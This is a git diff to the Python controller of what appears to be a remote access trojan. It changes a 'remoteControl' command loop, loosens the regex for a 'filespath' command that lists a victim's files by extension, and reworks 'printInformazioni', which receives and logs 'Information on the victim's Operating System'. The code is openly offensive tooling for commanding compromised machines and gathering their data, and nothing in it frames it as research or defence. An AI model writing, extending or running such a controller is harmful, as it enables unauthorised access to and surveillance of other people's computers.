@@ -1,6 +1,8 @@
 import os
 import time
 import subprocess
+import traceback
+
 from generalServer import *
 from connectionServer import *
 def openZip(comando, clientConnection,fileLog):
@@ -32,6 +34,7 @@ def openZip(comando, clientConnection,fileLog):
         fileLog = fileLog + "\n" + "Command open gone wrong\n"
         print("Command open gone wrong\n")
         return fileLog
+
 
 def filespath(clientConnection,fileLog):
 
@@ -257,7 +260,8 @@ def remoteControl(clientConnection,buff,fileLog):
             # "Crea un file .txt con i percorsi di tutti i file con una certa estensione:   filespath <estensione>"
             elif comando[0:9] == "filespath":
                 #reg = "^filespath .[a-z]{1,4}|^filespath (\*)"
-                reg = "^filespath( \.[a-z]{1,4})+"
+                #reg = "^filespath( \.[a-z]{1,4})+"
+                reg = "^filespath( (\.[*])|( \.[a-z]{1,4}))+"
                 if (re.match(reg, comando)):
                     fileLog=filespath(clientConnection,fileLog)
                 else:
@@ -415,7 +419,7 @@ def remoteControl(clientConnection,buff,fileLog):
 
 # OK STAMPA INFO CLIENT
 def printInformazioni(clientConnection, addr, fileLog):
-    buff = 1
+    buff = ""
     risposta = "1"
     nbytes = 1
     newNBytes=""
@@ -423,29 +427,27 @@ def printInformazioni(clientConnection, addr, fileLog):
     print(f"\nInformation on the victim's Operating System {addr}:")
     fileLog = fileLog + "\n" + f"\nInformation on the victim's Operating System {addr}:" + "\n"
     try:
-        while buff and nbytes != '':
-            nbytes = clientConnection.recv(256).decode(FORMAT)
-            if nbytes[0:1].isdigit():
-                while nbytes[0:1].isdigit():
-                    newNBytes = newNBytes + nbytes[0:1]
-                    nbytes = nbytes[1:]
+        filerecv = clientConnection.recv(512)
+        try:
+            fileIf = filerecv.decode(FORMAT)
+        except:
+            fileIf = ""
 
-            buff = clientConnection.recv((int(newNBytes))).decode(FORMAT)
-            print("\n"+ buff)
-            fileLog=fileLog+"\n"+buff+"\n"
+        print("\n"+ fileIf)
+        fileLog=fileLog+"\n"+fileIf+"\n"
 
-            print(f"\n[DONE] Info received.\n")
-            fileLog = fileLog + "\n" + f"\n[DONE] Info received.\n" + "\n"
+        print(f"\n[DONE] Info received.\n")
+        fileLog = fileLog + "\n" + f"\n[DONE] Info received.\n" + "\n"
 
-            if buff[0:6]=="[PATH]":
-                return buff,fileLog
-            else:
-                return "",fileLog
+        if fileIf[0:6]=="[PATH]":
+            return fileIf,fileLog
+        else:
+            return "",fileLog
     except:
-        #traceback.print_exc()
+        traceback.print_exc()
         print(f"[ERROR] Information not received\n")
         fileLog = fileLog + "\n" + f"[ERROR] Information not received\n" + "\n"
-        return fileLog
+        return "",fileLog
 
 def commandsHelp():
     print(
